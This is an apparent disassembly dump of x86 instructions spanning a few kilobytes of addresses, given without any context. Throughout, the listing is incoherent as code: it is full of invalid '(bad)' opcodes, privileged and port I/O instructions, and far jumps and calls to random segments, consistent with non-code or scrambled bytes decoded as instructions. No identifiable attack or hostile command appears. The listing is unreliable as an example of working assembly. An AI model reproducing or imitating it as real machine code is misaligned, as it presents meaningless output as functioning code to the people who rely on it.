  427d76:	xchg   esp,eax
  427d77:	jne    0x427d0e
  427d79:	xchg   ecx,eax
  427d7a:	push   edx
  427d7b:	push   esp
  427d7c:	ror    DWORD PTR [ecx-0x8],cl
  427d7f:	in     eax,dx
  427d80:	in     eax,0xa2
  427d82:	aas    
  427d83:	sbb    BYTE PTR [eax],cl
  427d85:	dec    edi
  427d86:	or     DWORD PTR ds:0x84786a0b,edi
  427d8c:	scas   eax,DWORD PTR es:[edi]
  427d8d:	add    DWORD PTR [edx-0x6373f4f],ebp
  427d93:	enter  0x4f74,0x2a
  427d97:	icebp  
  427d98:	jns    0x427ddf
  427d9a:	lds    esi,FWORD PTR [edi]
  427d9c:	push   esi
  427d9d:	pop    edi
  427d9e:	(bad)  
  427d9f:	pop    ds
  427da0:	in     al,dx
  427da1:	dec    ebp
  427da2:	adc    BYTE PTR [ebx+0x27],bl
  427da5:	xor    DWORD PTR [esi+0x55],esi
  427da8:	retf   
  427da9:	test   BYTE PTR [ebp-0x77],0x37
  427dad:	xchg   bl,ah
  427daf:	jge    0x427e1b
  427db1:	in     al,0x1d
  427db3:	pop    esi
  427db4:	std    
  427db5:	pop    edx
  427db6:	sub    esp,DWORD PTR [edi+0x1fa05fa2]
  427dbc:	pop    ebp
  427dbd:	mov    al,ds:0x7b4ce665
  427dc2:	sbb    al,0xdc
  427dc4:	jae    0x427d8c
  427dc6:	inc    eax
  427dc7:	dec    eax
  427dc8:	mov    bh,0x1b
  427dca:	fistp  QWORD PTR [esi+ebx*8]
  427dcd:	out    0xee,al
  427dcf:	mov    ebx,0x7721d615
  427dd4:	dec    ebp
  427dd5:	loope  0x427e2b
  427dd7:	dec    edi
  427dd8:	fsubr  QWORD PTR [edx]
  427dda:	mov    DWORD PTR [eax],ebx
  427ddc:	neg    BYTE PTR ds:0xbcd50ad5
  427de2:	sub    al,0xd9
  427de4:	dec    ecx
  427de5:	icebp  
  427de6:	inc    esi
  427de7:	hlt    
  427de8:	mov    bh,0x6f
  427dea:	cmp    al,0x19
  427dec:	out    0x4d,al
  427dee:	call   0x5c6:0x43f061cc
  427df5:	push   0x74f1b53e
  427dfa:	push   ebx
  427dfb:	frstor [eax+edx*1]
  427dfe:	mov    eax,0xed16a8f1
  427e03:	das    
  427e04:	and    edi,DWORD PTR [ecx]
  427e06:	xchg   BYTE PTR [ecx],ch
  427e08:	imul   ecx,DWORD PTR [edx-0x67],0x96896ed6
  427e0f:	pop    ebp
  427e10:	jbe    0x427e3b
  427e12:	cmp    BYTE PTR [eax+0x1d24ac17],cl
  427e18:	into   
  427e19:	fld    QWORD PTR [edx+0x53103b70]
  427e1f:	xchg   ebx,eax
  427e20:	sub    al,0xbe
  427e22:	mov    dl,0xde
  427e24:	cli    
  427e25:	xchg   BYTE PTR [eax+ebp*8+0x56],dl
  427e29:	out    dx,eax
  427e2a:	ja     0x427dd0
  427e2c:	fsubr  QWORD PTR [eax+0x7b3fe131]
  427e32:	lock popa 
  427e34:	push   0x56828724
  427e39:	retf   
  427e3a:	mov    eax,ds:0xade55095
  427e3f:	fstp   QWORD PTR [ecx-0x13fd1ce2]
  427e45:	loop   0x427e99
  427e47:	inc    ebx
  427e48:	addr16 ret 
  427e4a:	scas   eax,DWORD PTR es:[edi]
  427e4b:	dec    edx
  427e4c:	in     eax,0x6e
  427e4e:	dec    eax
  427e4f:	push   es
  427e50:	mov    edi,0xe022081
  427e55:	fld    DWORD PTR fs:[ecx-0x21e29d17]
  427e5c:	sub    ecx,DWORD PTR [eax]
  427e5e:	out    0xd9,al
  427e60:	cmp    eax,edi
  427e62:	ret    
  427e63:	or     eax,0x31eb55f4
  427e68:	sbb    edi,ebp
  427e6a:	test   BYTE PTR [edx-0x2fc387b5],cl
  427e70:	in     eax,dx
  427e71:	mov    ebp,0x79fd08e0
  427e76:	dec    esp
  427e77:	or     bh,BYTE PTR [bx+di+0x4073]
  427e7c:	jge    0x427e04
  427e7e:	jmp    0x206b339d
  427e83:	jge    0x427e5f
  427e85:	(bad)  
  427e87:	aam    0x35
  427e89:	cmp    BYTE PTR [esi],dh
  427e8b:	in     al,0xae
  427e8d:	clc    
  427e8e:	arpl   WORD PTR [ebp-0x14],ax
  427e91:	push   ebx
  427e92:	stos   BYTE PTR es:[edi],al
  427e93:	mov    bl,0x4e
  427e95:	ins    DWORD PTR es:[edi],dx
  427e96:	sbb    ch,BYTE PTR [eax+0x60]
  427e99:	icebp  
  427e9a:	test   BYTE PTR [edx],ch
  427e9c:	cmp    cl,BYTE PTR [ebx+0x30]
  427e9f:	adc    BYTE PTR es:[ebx+ecx*2],cl
  427ea3:	daa    
  427ea4:	outs   dx,BYTE PTR ds:[esi]
  427ea5:	mov    eax,0xe35c6bff
  427eaa:	shl    BYTE PTR [edi-0x218f34fc],cl
  427eb0:	push   es
  427eb1:	xchg   esp,eax
  427eb2:	mov    DWORD PTR [eax],esi
  427eb4:	jg     0x427f1c
  427eb6:	call   0xf608:0x3bc6bedd
  427ebd:	ret    0xb4ed
  427ec0:	fild   QWORD PTR [eax+0x3586b1cf]
  427ec6:	xchg   ebp,eax
  427ec7:	and    edi,DWORD PTR [ebp-0x5474c137]
  427ecd:	add    dl,dh
  427ecf:	pusha  
  427ed0:	mov    al,0xb3
  427ed2:	imul   esp,DWORD PTR [esi],0xfffffff2
  427ed5:	xlat   BYTE PTR ds:[ebx]
  427ed6:	pushf  
  427ed7:	popf   
  427ed8:	push   edx
  427ed9:	mov    eax,0xdf77ad9f
  427ede:	pop    es
  427edf:	sbb    bh,dl
  427ee1:	out    dx,eax
  427ee2:	mov    ecx,0xf93ee9a9
  427ee7:	sbb    DWORD PTR [ebx+edx*1-0xb],esp
  427eeb:	jg     0x427ef0
  427eed:	out    dx,eax
  427eee:	jnp    0x427f68
  427ef0:	adc    ah,BYTE PTR [edi-0x3e46ee54]
  427ef6:	pop    edi
  427ef7:	or     BYTE PTR [eiz*2+0x6ea1357],ah
  427efe:	repz and eax,0xc579fd80
  427f04:	push   esi
  427f05:	xlat   BYTE PTR ds:[ebx]
  427f06:	shl    bl,1
  427f08:	repz push ds
  427f0a:	dec    ecx
  427f0b:	hlt    
  427f0c:	mov    ebx,0x45
	...
  427f19:	add    BYTE PTR [edx-0x107ddbc],bl
  427f1f:	(bad)  
  427f20:	fisub  DWORD PTR [esi-0x37]
  427f23:	and    dh,BYTE PTR [ecx+edx*1-0x38]
  427f27:	leave  
  427f28:	push   0x1f424be
  427f2d:	add    ah,bh
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    BYTE PTR [ebx-0xbe2472],ch
  427f37:	mov    ds:0x2baab681,eax
  427f3c:	or     dh,ch
  427f3e:	std    
  427f3f:	cmp    bl,BYTE PTR [ebp+0x2c]
  427f42:	mov    edi,0x506d23f9
  427f47:	sti    
  427f48:	sbb    bh,0x5b
  427f4b:	fs sbb eax,0x6d62d970
  427f51:	mov    esp,0xf31b130b
  427f56:	push   0x6a61983a
  427f5b:	retf   0x7a1e
  427f5e:	jb     0x427fae
  427f60:	adc    eax,0x27708092
  427f65:	scas   eax,DWORD PTR es:[edi]
  427f66:	sbb    eax,0x8aadbe2d
  427f6b:	(bad)  
  427f6c:	out    dx,eax
  427f6d:	rcr    DWORD PTR [ecx-0x2b],0x7a
  427f71:	mov    ecx,0xb13b5ef7
  427f76:	imul   ecx,edi,0xa0ca0bbd
  427f7c:	adc    DWORD PTR [esi+0x76b83f50],0xd394476d
  427f86:	sbb    edx,esi
  427f88:	lods   eax,DWORD PTR ds:[esi]
  427f89:	xchg   esi,eax
  427f8a:	icebp  
  427f8b:	mov    bh,0xf
  427f8d:	inc    ecx
  427f8e:	mov    ebx,0x5c7172e2
  427f93:	ins    BYTE PTR es:[edi],dx
  427f94:	jns    0x427fbe
  427f96:	sahf   
  427f97:	retf   0xabc0
  427f9a:	sbb    edi,DWORD PTR ds:0x945b8da0
  427fa0:	and    esi,ecx
  427fa2:	les    eax,FWORD PTR [esi+0x69e357f8]
  427fa8:	dec    esp
  427fa9:	test   BYTE PTR [edx+0x29],bh
  427fac:	fmul   st,st(1)
  427fae:	lock sar BYTE PTR [ebp-0x3c3d6285],cl
  427fb5:	jp     0x427fd7
  427fb7:	loopne 0x42800c
  427fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427fba:	adc    ah,bh
  427fbc:	push   ebx
  427fbd:	jp     0x427f94
  427fbf:	mov    ebx,0x17c8dc15
  427fc4:	xchg   edx,ebx
  427fc6:	and    edx,DWORD PTR [esi]
  427fc8:	mov    eax,ds:0x66c49478
  427fcd:	test   BYTE PTR [esi],0x9b
  427fd0:	adc    BYTE PTR [esi+0x73],0x23
  427fd4:	add    bh,BYTE PTR [edx-0x4b]
  427fd7:	jg     0x428030
  427fd9:	pop    ebx
  427fda:	pop    ds
  427fdb:	or     edi,ebx
  427fdd:	mov    edi,0xbf0cd6d3
  427fe2:	int3   
  427fe3:	lods   eax,DWORD PTR ds:[esi]
  427fe4:	add    eax,0x23ab7063
  427fe9:	(bad)  
  427fea:	jmp    0x5c80aa05
  427fef:	retf   
  427ff0:	push   ebx
  427ff1:	stc    
  427ff2:	(bad)  [ecx+0x7d0f3233]
  427ff8:	adc    BYTE PTR [eax+ebp*2],cl
  427ffb:	call   0x184a3af1
  428000:	or     al,0xd1
  428002:	inc    edx
  428003:	inc    ebp
  428004:	test   eax,0xccd9e8ae
  428009:	inc    ebp
  42800a:	aad    0x50
  42800c:	jo     0x42806f
  42800e:	hlt    
  42800f:	add    ch,0x2a
  428012:	int    0xb8
  428014:	(bad)  
  428015:	jle    0x428071
  428017:	shr    DWORD PTR [eax-0x44cd054],0x1
  42801e:	loop   0x427fa7
  428020:	fwait
  428021:	jbe    0x428033
  428023:	xor    BYTE PTR [edi+0x4354dda8],al
  428029:	adc    BYTE PTR [ecx],dl
  42802b:	jae    0x427ffa
  42802d:	xchg   esi,eax
  42802e:	das    
  42802f:	hlt    
  428030:	stos   DWORD PTR es:[edi],eax
  428031:	xchg   esp,eax
  428032:	addr16 pop esi
  428034:	pop    edx
  428035:	mov    ch,0xaa
  428037:	pushf  
  428038:	push   ecx
  428039:	inc    ebp
  42803a:	mov    al,0xf5
  42803c:	inc    ebx
  42803d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42803e:	or     BYTE PTR [ebp+edi*2-0x59],0xc9
  428043:	and    ebp,DWORD PTR [edx+0x226e42a2]
  428049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42804a:	or     bl,0x5c
  42804d:	pop    ds
  42804e:	or     dl,bh
  428050:	out    0x8a,al
  428052:	lea    ebx,[ebx]
  428054:	sar    BYTE PTR [edx],1
  428056:	lods   al,BYTE PTR ds:[esi]
  428057:	lahf   
  428058:	stos   DWORD PTR es:[edi],eax
  428059:	mov    al,bl
  42805b:	adc    ecx,ebx
  42805d:	mov    ah,0x4b
  42805f:	fnstenv [ecx-0x25]
  428062:	jae    0x428086
  428064:	xchg   ecx,eax
  428065:	test   ebx,0x54646a4e
  42806b:	and    esp,ecx
  42806d:	test   DWORD PTR [ecx-0x44195ab8],ecx
  428073:	jno    0x428084
  428075:	push   esp
  428076:	stc    
  428077:	inc    esi
  428078:	fadd   QWORD PTR [ebp-0x7]
  42807b:	and    ah,0x12
  42807e:	sub    al,0xbc
  428080:	pop    esp
  428081:	cmp    bl,ah
  428083:	dec    esi
  428084:	stc    
  428085:	cmp    ah,BYTE PTR [edx]
  428087:	jmp    0xffe33e82
  42808c:	push   ds
  42808d:	rcl    DWORD PTR [eax+edx*2+0x4c],0x71
  428092:	aam    0x8d
  428094:	push   ebx
  428095:	add    DWORD PTR [ebp-0x74],esp
  428098:	mov    ah,0x2b
  42809a:	(bad)  
  42809c:	xchg   BYTE PTR [ecx+eax*2+0x2a55be14],bh
  4280a3:	jl     0x42802b
  4280a5:	call   0x73c1:0x480257bd
  4280ac:	sbb    al,0xc1
  4280ae:	mov    dh,0x3a
  4280b0:	push   edx
  4280b1:	dec    esi
  4280b2:	sbb    ebp,DWORD PTR [edi+0x32]
  4280b5:	pop    eax
  4280b6:	call   0x5640:0x17d353b5
  4280bd:	bnd jno 0x428082
  4280c0:	daa    
  4280c1:	mov    bl,ch
  4280c3:	jae    0x4280c8
  4280c5:	call   0x95e57988
  4280ca:	jns    0x42814b
  4280cc:	push   edx
  4280cd:	mov    ah,0x17
  4280cf:	add    BYTE PTR [edx+eax*8+0x3],dh
  4280d3:	repnz pop esp
  4280d5:	sti    
  4280d6:	rep lods eax,DWORD PTR ds:[esi]
  4280d8:	shr    DWORD PTR es:[esi-0x7f96dfa2],1
  4280df:	jg     0x428115
  4280e1:	cs call 0x6ee7:0x343dbd68
  4280e9:	in     al,dx
  4280ea:	fs aad 0xc
  4280ed:	mov    ebp,0x56025de0
  4280f2:	sbb    al,0x5b
  4280f4:	sub    eax,0x14ba3fb5
  4280f9:	(bad)  [ecx]
  4280fb:	(bad)  
  4280fc:	push   cs
  4280fd:	int    0x7f
  4280ff:	sbb    BYTE PTR [eax+eiz*4-0x60fbdddf],0xcb
  428107:	fcomp  DWORD PTR [ebx+eax*2-0x28]
  42810b:	sub    DWORD PTR [esp+ebp*8+0xa],eax
  42810f:	ret    0xdb29
  428112:	xor    eax,0x8ed56f5e
  428117:	mov    edi,DWORD PTR [edi]
  428119:	test   al,0xd5
  42811b:	add    ebx,ebp
  42811d:	daa    
  42811e:	mov    bl,0x59
  428120:	add    dh,bl
  428122:	dec    ecx
  428123:	cdq    
  428124:	mov    al,0xd1
  428126:	lahf   
  428127:	or     ch,al
  428129:	mov    eax,0x35e28bb3
	...
  42813a:	nop
  42813b:	stos   DWORD PTR es:[edi],eax
  42813c:	es ret 
  42813e:	aas    
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	pop    ebp
  428147:	cmp    ah,bh
  428149:	retf   0xf620
  42814c:	add    DWORD PTR [eax],eax
  42814e:	cld    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    BYTE PTR [edi-0x5f1c53a0],bh
  428157:	cmp    esp,DWORD PTR [edi]
  428159:	jmp    0x16cf162b
  42815e:	repz sar BYTE PTR [esi-0x1ca4a58b],1
  428165:	daa    
  428166:	inc    edx
  428167:	pop    ss
  428168:	aad    0x7d
  42816a:	mov    eax,0x5bce296d
  42816f:	inc    edx
  428170:	inc    esi
  428171:	sub    BYTE PTR [edi],dl
  428173:	add    DWORD PTR [esi-0x7dbca208],edx
  428179:	pop    ds
  42817a:	xor    ebp,DWORD PTR [ecx+edi*2]
  42817d:	fs jae 0x42810c
  428180:	mov    ds:0xba36b4bf,al
  428185:	mov    dh,0xd3
  428187:	add    al,0xbb
  428189:	jp     0x42815f
  42818b:	xor    eax,0x18c4b554
  428190:	adc    eax,DWORD PTR [eax-0x1681703a]
  428196:	push   edx
  428197:	and    al,0x19
  428199:	imul   ebx,DWORD PTR [eax+0x6334ea4d],0x627f2677
  4281a3:	xchg   edx,eax
  4281a4:	fxam   
  4281a6:	adc    ebx,eax
  4281a8:	adc    ah,BYTE PTR [ecx]
  4281aa:	popf   
  4281ab:	or     eax,0xf01033c3
  4281b0:	lds    ebp,FWORD PTR [ebx-0x74b7e499]
  4281b6:	jo     0x428164
  4281b8:	cmp    ebp,DWORD PTR [ebx+0x6f17eef4]
  4281be:	mov    ebp,DWORD PTR [edx-0x5ce8a615]
  4281c4:	lahf   
  4281c5:	and    al,0xfd
  4281c7:	popa   
  4281c8:	ins    BYTE PTR es:[edi],dx
  4281c9:	xchg   BYTE PTR [edx+ebx*2-0x6a],dl
  4281cd:	or     ah,BYTE PTR [ecx]
  4281cf:	stos   DWORD PTR es:[edi],eax
  4281d0:	mov    ss,WORD PTR [edx]
  4281d2:	pop    esp
  4281d3:	cs cld 
  4281d5:	cli    
  4281d6:	imul   esi,DWORD PTR [edx],0x4eb23860
  4281dc:	ins    BYTE PTR es:[edi],dx
  4281dd:	xchg   ecx,eax
  4281de:	test   BYTE PTR [eax],al
  4281e0:	mov    esi,0x351c8ba9
  4281e5:	inc    edi
  4281e6:	push   edi
  4281e7:	sbb    BYTE PTR [ebp+0x49],bl
  4281ea:	mov    esp,es
  4281ec:	mov    WORD PTR [ebx],gs
  4281ee:	(bad)  
  4281ef:	mov    ah,0x53
  4281f1:	in     al,0x8f
  4281f3:	fs daa 
  4281f5:	call   0x5755:0x83389892
  4281fc:	test   ebx,edx
  4281fe:	mov    BYTE PTR [edi-0x13],ah
  428201:	or     al,0x50
  428203:	repz fst QWORD PTR [ebx-0x1d]
  428207:	rcr    DWORD PTR [eax-0x37931d00],1
  42820d:	popf   
  42820e:	ja     0x428251
  428210:	jnp    0x4281e9
  428212:	jmp    DWORD PTR [eax-0x2c]
  428215:	pusha  
  428216:	xchg   esp,eax
  428217:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  428219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42821a:	sbb    ebp,edx
  42821c:	loope  0x4281a8
  42821e:	out    0xe4,al
  428220:	or     DWORD PTR [esi],ecx
  428222:	or     eax,ebx
  428224:	mov    esi,0x67f2ade9
  428229:	ja     0x42824d
  42822b:	lock fsub QWORD PTR [edi+0x1f382d0f]
  428232:	mov    bl,0x47
  428235:	mov    ah,0x28
  428237:	push   es
  428238:	cmp    bh,ch
  42823a:	mov    edi,0xf739dfb0
  42823f:	aas    
  428240:	lds    esp,FWORD PTR [edi*4-0x4ff0b948]
  428247:	mov    esi,DWORD PTR [esi]
  428249:	cmp    eax,0x58ec6e50
  42824e:	add    edx,0x59
  428251:	inc    eax
  428252:	popf   
  428253:	fidivr WORD PTR [ecx]
  428255:	popf   
  428256:	inc    esp
  428257:	hlt    
  428258:	cmp    bh,bh
  42825a:	adc    eax,DWORD PTR [ebx+0x21]
  42825d:	inc    eax
  42825e:	or     dl,ch
  428260:	pop    esi
  428261:	mov    al,0x40
  428263:	aaa    
  428264:	jg     0x428264
  428266:	xchg   edi,eax
  428267:	mov    al,ds:0x939f119b
  42826c:	lods   eax,DWORD PTR ds:[esi]
  42826d:	mov    eax,0x71c759f7
  428272:	add    ax,0x461e
  428276:	pop    ss
  428277:	mov    fs,ecx
  428279:	inc    esi
  42827a:	inc    ecx
  42827b:	push   ecx
  42827c:	jbe    0x428201
  42827e:	dec    ecx
  42827f:	and    ch,BYTE PTR [eax+0x5a420546]
  428285:	push   DWORD PTR [ecx-0x43d616e4]
  42828b:	mov    edi,0x2baaa335
  428290:	ja     0x428235
  428292:	fidiv  DWORD PTR [ebx-0x4]
  428295:	(bad)  
  428296:	mov    ?,WORD PTR [edi+edi*1]
  428299:	jnp    0x4282e0
  42829b:	in     eax,dx
  42829c:	add    bl,BYTE PTR [esi+0x229e738]
  4282a2:	aam    0xd6
  4282a4:	cmp    al,0xad
  4282a6:	inc    ebp
  4282a7:	jecxz  0x4282ed
  4282a9:	mov    DWORD PTR es:[edi+0x6892e36d],ebp
  4282b0:	cmp    BYTE PTR [ebx-0x6f9e76ef],dh
  4282b6:	stos   DWORD PTR es:[edi],eax
  4282b7:	add    eax,0x35543f8d
  4282bc:	clc    
  4282bd:	mov    esi,?
  4282bf:	out    dx,eax
  4282c0:	inc    edi
  4282c1:	sub    bl,ah
  4282c3:	jmp    0x4282ac
  4282c5:	mov    ah,0x8a
  4282c7:	mov    edi,0xf7f588a0
  4282cc:	(bad)  
  4282cd:	imul   ecx,DWORD PTR [edx-0x75cde570],0x3f
  4282d4:	cmp    al,0xe0
  4282d6:	js     0x4282a7
  4282d8:	rcr    DWORD PTR [esi+0x6c99f6f4],0xea
  4282df:	sub    DWORD PTR [ebx+eiz*4+0x59],ebx
  4282e3:	stos   DWORD PTR es:[edi],eax
  4282e4:	jae    0x42834a
  4282e6:	sbb    al,0x61
  4282e8:	cwde   
  4282e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282ea:	les    edi,FWORD PTR [edx+ebp*4-0x4a952b49]
  4282f1:	mov    esp,DWORD PTR [esi]
  4282f3:	and    esp,DWORD PTR [eax]
  4282f5:	sbb    BYTE PTR gs:[edx],ch
  4282f8:	push   esi
  4282f9:	aas    
  4282fa:	jg     0x428323
  4282fc:	inc    esi
  4282fd:	inc    eax
  4282fe:	or     bl,0x25
  428301:	inc    DWORD PTR [eax]
  428303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428305:	lock cmp al,0x2a
  428308:	std    
  428309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42830a:	imul   esi,esi,0x4938e6ad
  428310:	in     al,0xa0
  428312:	sbb    esp,edx
  428314:	div    ch
  428316:	inc    ebp
  428317:	and    ebp,eax
  428319:	and    BYTE PTR [edi-0x6c],bl
  42831c:	rol    BYTE PTR [esi+0x7276f5f1],cl
  428322:	or     bh,cl
  428324:	pop    ebp
  428325:	pop    ebp
  428326:	xor    BYTE PTR [ecx-0x19324c6d],dl
  42832c:	loop   0x428391
  42832e:	inc    ecx
  42832f:	data16 xor al,0x16
  428332:	jle    0x4282e3
  428334:	stc    
  428335:	and    dl,BYTE PTR [edx]
  428337:	mov    cx,0xd6e
  42833b:	aam    0x6b
  42833d:	adc    edi,edi
  42833f:	fwait
  428340:	pop    ss
  428341:	rcr    ah,0x36
  428344:	cld    
  428345:	cwde   
  428346:	mov    DWORD PTR [ecx+0x24d4c1e0],edx
  42834c:	imul   edx,DWORD PTR [eax+0x0],0x0
  428356:	add    BYTE PTR [eax],al
  428358:	add    BYTE PTR [eax],al
  42835a:	std    
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x42836d
  428367:	fwait
  428368:	ins    BYTE PTR es:[edi],dx
  428369:	push   ss
  42836a:	sbb    al,0xf8
  42836c:	add    DWORD PTR [eax],eax
  42836e:	cld    
  42836f:	add    DWORD PTR [eax],eax
  428371:	add    BYTE PTR [esi+0xfebc121],al
  428377:	cdq    
  428378:	daa    
  428379:	retf   
  42837a:	inc    esp
  42837b:	add    BYTE PTR [ecx],0xa3
  42837e:	pop    edx
  42837f:	int    0xe9
  428381:	sbb    esp,DWORD PTR [esp+eax*4-0x3469eaf0]
  428388:	mov    cl,0xd5
  42838a:	push   ecx
  42838b:	xor    esi,DWORD PTR [eax]
  42838d:	jg     0x428320
  42838f:	dec    eax
  428390:	pop    es
  428391:	cmc    
  428392:	out    dx,eax
  428393:	add    DWORD PTR [ebp+0x39],edx
  428396:	jnp    0x428341
  428398:	sbb    ah,bl
  42839a:	int3   
  42839b:	mov    esi,0x85827ade
  4283a0:	js     0x4283ea
  4283a2:	popw   ss
  4283a4:	xchg   ebp,eax
  4283a5:	sbb    DWORD PTR [ebp-0x77970e10],esi
  4283ab:	shl    DWORD PTR [edx-0x4e332c91],1
  4283b1:	pop    edx
  4283b2:	(bad)  
  4283b3:	repnz shl eax,1
  4283b6:	and    edi,DWORD PTR [edi]
  4283b8:	fmulp  st(1),st
  4283ba:	pushf  
  4283bb:	xchg   esi,eax
  4283bc:	mov    eax,ds:0x7dd48b1c
  4283c1:	jbe    0x428403
  4283c3:	jecxz  0x4283dd
  4283c5:	push   0x8
  4283c7:	cmp    ah,BYTE PTR [ebx+eiz*2+0x726ec063]
  4283ce:	stc    
  4283cf:	push   ecx
  4283d0:	(bad)  
  4283d1:	out    dx,eax
  4283d2:	sub    DWORD PTR [eax+0x47],esi
  4283d5:	push   ss
  4283d6:	inc    esp
  4283d7:	ficom  WORD PTR [edx]
  4283d9:	mov    ecx,0x33293857
  4283de:	mov    al,0x62
  4283e0:	arpl   WORD PTR [esi],bp
  4283e2:	(bad)  
  4283e3:	jmp    0x38f0:0x52a8ef28
  4283ea:	xor    al,0xca
  4283ec:	mov    ch,0xaa
  4283ee:	xchg   esp,eax
  4283ef:	lods   al,BYTE PTR ds:[esi]
  4283f0:	pop    edi
  4283f1:	lahf   
  4283f2:	lods   eax,DWORD PTR cs:[esi]
  4283f4:	pop    ss
  4283f5:	jo     0x4283a8
  4283f7:	push   edi
  4283f8:	and    esp,DWORD PTR [ebx-0x6dff9be1]
  4283fe:	ss mov bh,0xcb
  428401:	add    BYTE PTR [ecx+ebp*4-0x217c19e4],ch
  428408:	in     al,dx
  428409:	jmp    0x4283f5
  42840b:	pop    es
  42840c:	jp     0x42846c
  42840e:	ror    eax,1
  428410:	cmp    edi,DWORD PTR [esi+0x78]
  428413:	dec    esp
  428414:	es jg  0x428465
  428417:	xchg   esi,eax
  428418:	mov    ecx,0x234cfacc
  42841d:	ins    DWORD PTR es:[edi],dx
  42841e:	sahf   
  42841f:	loope  0x4283f1
  428421:	or     eax,DWORD PTR [edi+ebp*2]
  428424:	mov    edx,0x84aab249
  428429:	cli    
  42842a:	sti    
  42842b:	xchg   bh,bl
  42842d:	loopne 0x42843e
  42842f:	cs mov ebx,0x6f341d7d
  428435:	pop    esp
  428436:	icebp  
  428437:	ret    
  428438:	aas    
  428439:	ss pop esi
  42843b:	js     0x42849e
  42843d:	ins    BYTE PTR es:[edi],dx
  42843e:	and    dh,BYTE PTR [eax]
  428440:	pop    edx
  428441:	ins    BYTE PTR es:[edi],dx
  428442:	fist   DWORD PTR [edx+0x2d075b7e]
  428448:	shl    BYTE PTR [ecx],0x20
  42844b:	pop    esp
  42844c:	clc    
  42844d:	inc    edx
  42844e:	jmp    0x7bc4:0x848a65e8
  428455:	sbb    al,ah
  428457:	js     0x4284bf
  428459:	mov    al,ds:0xdf0c9104
  42845e:	stos   DWORD PTR es:[edi],eax
  42845f:	xor    BYTE PTR [ebx],bl
  428461:	xor    DWORD PTR [esi+eax*4],0xeccc073d
  428468:	mov    eax,ds:0x1c1b1676
  42846d:	mov    eax,ds:0xe346d47
  428472:	sub    al,0xa3
  428474:	fld    QWORD PTR [edi+ebx*8-0x8]
  428478:	call   0xa0f4:0x68bf3d7f
  42847f:	fidivr WORD PTR es:[ebx+ebx*4-0x7e56fc77]
  428487:	inc    ebx
  428488:	jno    0x428508
  42848a:	repz mov ax,0x333f
  42848f:	call   0x9256:0x7e9e15e1
  428496:	sub    dl,bl
  428498:	xor    al,0xaf
  42849a:	mov    bl,0xdf
  42849c:	into   
  42849d:	inc    bp
  42849f:	xchg   ecx,eax
  4284a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284a1:	mov    BYTE PTR [ebx+0x1a],bh
  4284a4:	popa   
  4284a5:	imul   ecx,DWORD PTR [edx],0xc20f403
  4284ab:	adc    eax,DWORD PTR [ecx+esi*1+0x2b38ef35]
  4284b2:	outs   dx,DWORD PTR ds:[esi]
  4284b3:	sbb    al,0x5c
  4284b5:	clc    
  4284b6:	jbe    0x428523
  4284b8:	xor    BYTE PTR [edi-0x6],0xf
  4284bc:	jp     0x428459
  4284be:	xor    ebx,DWORD PTR [eax]
  4284c0:	jb     0x428454
  4284c2:	test   BYTE PTR [ebp-0x2a],0x90
  4284c6:	inc    edi
  4284c7:	xchg   ecx,eax
  4284c8:	ror    DWORD PTR [ecx+edi*8],1
  4284cb:	(bad)  
  4284cc:	(bad)  
  4284ce:	mov    ecx,0x4109e3fa
  4284d3:	sbb    DWORD PTR [ecx-0x7e],ebx
  4284d6:	repz scas eax,DWORD PTR es:[edi]
  4284d8:	out    dx,al
  4284d9:	stos   DWORD PTR es:[edi],eax
  4284da:	lods   al,BYTE PTR ds:[esi]
  4284db:	dec    ebp
  4284dc:	ja     0x428485
  4284de:	rcl    DWORD PTR [ebp-0x6fe2c8b4],0x7d
  4284e5:	mov    eax,0xb8476b1
  4284ea:	adc    bl,ah
  4284ec:	test   DWORD PTR [edx-0x77],eax
  4284ef:	leave  
  4284f0:	mov    ebx,DWORD PTR [eax-0x54b4938f]
  4284f6:	jns    0x4284c3
  4284f8:	sahf   
  4284f9:	les    ebx,FWORD PTR [ebp-0x68]
  4284fc:	inc    ebp
  4284fd:	mov    ebp,0x7d9d299
  428502:	jb     0x42856c
  428504:	gs xchg ebx,eax
  428506:	in     al,dx
  428507:	jmp    0x4c6e:0xffe0c236
  42850e:	push   0x4edb3a3e
  428513:	push   ds
  428514:	push   ds
  428515:	stc    
  428516:	xlat   BYTE PTR ds:[ebx]
  428517:	mov    al,0xa
  428519:	ins    DWORD PTR es:[edi],dx
  42851a:	sub    BYTE PTR [edi],dh
  42851c:	xchg   esp,eax
  42851d:	and    DWORD PTR [ecx-0x4f0f4f3d],ebp
  428523:	push   ss
  428524:	mov    esp,0x7d6a2e94
  428529:	mov    esi,0x64349d68
  42852e:	imul   esi,DWORD PTR [edx-0x6fa3b204],0x4712c8a3
  428538:	lods   eax,DWORD PTR ds:[esi]
  428539:	pop    esp
  42853a:	leave  
  42853b:	(bad)  
  42853c:	test   al,0xf2
  42853e:	and    al,0x78
  428540:	jg     0x42851c
  428542:	push   ss
  428543:	not    BYTE PTR [edi-0x1fca86d0]
  428549:	arpl   WORD PTR [edi+edx*2-0x3f],dx
  42854d:	xchg   ebp,eax
  42854e:	xchg   ebx,eax
  42854f:	inc    ecx
  428550:	xor    bl,BYTE PTR [ebx*4-0x11f3198d]
  428557:	adc    eax,0xc9878720
  42855c:	pop    es
  42855d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42855e:	pop    ds
  42855f:	jne    0x4285ac
  428561:	mov    edi,0x67ba68e8
  428566:	push   ss
  428567:	xchg   edx,eax
  428568:	mov    eax,0xf336d46c
  42856d:	sbb    DWORD PTR [eax],eax
	...
  428577:	add    BYTE PTR [eax],al
